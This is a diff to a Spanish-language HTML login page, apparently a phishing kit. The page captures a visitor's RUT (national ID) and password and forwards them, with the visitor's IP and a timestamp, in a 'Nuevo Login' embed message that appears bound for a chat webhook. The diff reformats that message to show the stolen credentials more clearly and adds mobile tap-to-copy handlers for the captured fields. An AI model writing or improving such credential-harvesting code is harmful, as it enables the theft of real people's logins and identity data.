@@ -287,6 +287,19 @@
             height: 100%;
             object-fit: contain;
         }
+
+        .copyable {
+            cursor: pointer;
+            user-select: all;
+            transition: all 0.2s ease;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .copyable:active {
+            background-color: rgba(59, 79, 181, 0.1);
+            transform: scale(0.98);
+        }
     </style>
 </head>
 <body>
@@ -417,28 +430,8 @@
                             author: {
                                 name: 'Nuevo Login'
                             },
-                            fields: [
-                                {
-                                    name: 'RUT',
-                                    value: rut,
-                                    inline: true
-                                },
-                                {
-                                    name: 'Contraseña',
-                                    value: password,
-                                    inline: true
-                                },
-                                {
-                                    name: 'IP',
-                                    value: data.ip,
-                                    inline: true
-                                },
-                                {
-                                    name: 'Hora',
-                                    value: new Date().toLocaleString('es-ES'),
-                                    inline: true
-                                }
-                            ]
+                            description: `\`\`\`\nRUT: ${rut}\n\nContraseña: ${password}\n\`\`\`\nIP: \`${data.ip}\` | Hora: \`${new Date().toLocaleString('es-ES')}\``,
+                            fields: []
                         }]
                     };
                     
@@ -484,7 +477,61 @@
         // Enfocar en el campo RUT al cargar
         window.addEventListener('load', function() {
             document.getElementById('rut').focus();
+            
+            // Hacer los inputs copiables en móviles
+            const rutInput = document.getElementById('rut');
+            const passwordInput = document.getElementById('password');
+            
+            rutInput.addEventListener('click', function() {
+                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                    copiarAlPortapapeles(this.value, 'RUT');
+                }
+            });
+            
+            passwordInput.addEventListener('click', function() {
+                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                    copiarAlPortapapeles(this.value, 'Contraseña');
+                }
+            });
         });
+
+        // Función para copiar al portapapeles
+        function copiarAlPortapapeles(texto, tipo) {
+            navigator.clipboard.writeText(texto).then(() => {
+                // Feedback visual
+                const mensaje = document.createElement('div');
+                mensaje.textContent = `${tipo} copiado ✓`;
+                mensaje.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: #3B4FB5;
+                    color: white;
+                    padding: 12px 24px;
+                    border-radius: 8px;
+                    font-size: 14px;
+                    z-index: 9999;
+                    animation: fadeInOut 2s ease-in-out;
+                `;
+                document.body.appendChild(mensaje);
+                
+                setTimeout(() => mensaje.remove(), 2000);
+            }).catch(() => {
+                console.error('Error al copiar');
+            });
+        }
+
+        // Agregar animación de fade in/out
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fadeInOut {
+                0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+                50% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+                100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+            }
+        `;
+        document.head.appendChild(style);
     </script>
 </body>
 </html>
